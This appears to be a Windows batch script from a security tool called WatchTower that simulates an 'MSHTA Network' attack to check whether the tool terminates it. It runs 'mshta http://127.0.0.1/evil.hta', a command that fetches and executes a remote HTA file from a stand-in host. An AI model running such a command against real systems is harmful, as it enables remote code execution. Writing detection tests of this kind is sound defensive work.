@echo off
echo ==================================================
echo      WatchTower Attack Simulation: MSHTA
echo ==================================================
echo.
echo This script simulates an "MSHTA Network" attack.
echo It attempts to use mshta.exe to execute a remote HTA file.
echo.
echo Command: mshta http://127.0.0.1/evil.hta
echo.
echo Launching MSHTA...
echo.

mshta http://127.0.0.1/evil.hta

if %errorlevel% neq 0 (
    echo.
    echo ==================================================
    echo [SUCCESS] The attack process was terminated!
    echo ==================================================
) else (
    echo.
    echo ==================================================
    echo If you see this message, the attack completed
    echo without being suspended/terminated.
    echo ==================================================
)
pause
